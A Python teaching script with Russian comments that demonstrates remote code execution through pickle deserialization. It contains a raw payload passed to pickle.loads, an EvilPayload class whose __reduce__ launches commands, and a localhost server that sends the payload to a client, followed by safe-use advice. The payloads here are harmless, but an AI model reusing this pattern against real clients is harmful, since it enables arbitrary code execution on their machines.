# ========================= Аспекты безопасности ==============================
# ---------------------- Примеры работы с модулем pickle ----------------------

# Выдержки из официальной документации говорят о том,
# что модуль является не вполне безопасным решением для передачи объектов по сети.

# Модуль pickle служит для сохранения Python-объектов (сериализация/десериализация)
import os
import pickle
import platform
import subprocess
import socket
import sys

# Однако при десериализации не проверяется содержимое внутренностей объекта.
# Строка ниже выполнит системную функцию echo:

pickle.loads(b"cos\nsystem\n(S'echo I am Evil Pickle-module!'\ntR.")

# ------------------------------------------------------------------------------
# А что, если передать pickle-объект по сети? Хорошая идея!


# subprocess for Linux
def get_subprocess(file_with_args):
    PYTHON_PATH = sys.executable
    BASE_PATH = os.path.dirname(os.path.abspath(__file__))
    file_full_path = f"{PYTHON_PATH} {BASE_PATH}/{file_with_args}"
    # args = ["gnome-terminal", "--disable-factory", "--", "bash", "-c", file_full_path]
    args = ["gnome-terminal", "--", "bash", "-c", file_full_path]
    return subprocess.Popen(args, preexec_fn=os.setpgrp)


# Другой вариант - создать свой класс,
# метод __reduce__ которого должен будет осуществлять десериализацию
class EvilPayload:
    """
    Функция __reduce__ будет выполнена при распаковке объекта
    """
    def __reduce__(self):
        """
        Запустим на машине клиента безобидный Notepad (или другой редактор)
        """

        os.system("echo You've been hacked by Evil Pickle!!! > evil_msg.txt")

        if platform.system() == 'Linux':
            get_subprocess('run_evil_msg_for_ubuntu.py')
            return print, ("You've been hacked by Evil Pickle!!!", )

        return subprocess.Popen, (('notepad', 'evil_msg.txt'),)
 

# Реализуем простой сокет-сервер для демонстрации примера.
# Клиентское приложение находится в файле evil_pickle_client.py
def evil_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("localhost", 9999)) 
    print('Зловещий сервер запущен...')
    sock.listen()
    conn, addr = sock.accept()
    print('К нам попался клиент', addr)

    print('Отправляем ему "троянца"...')
    # Отсылаем опасный объект "доверчивому" клиенту
    conn.send(pickle.dumps(EvilPayload()))


evil_server()


# Некоторые рекомендации по безопасному использованию модуля pickle
# 1. По возможности, шифруйте сетевой трафик (SSL/TLS).
# 2. Если шифрование невозможно, пользуйтесь электронной подписью для подтверждения данных.
# 3. Если pickle-данные сохраняются на диск, убедитесь, что только доверенные процессы могут менять эти данные. 
# 4. По возможности, ибегайте модуля pickle. Воспользуйтесь, например, JSON.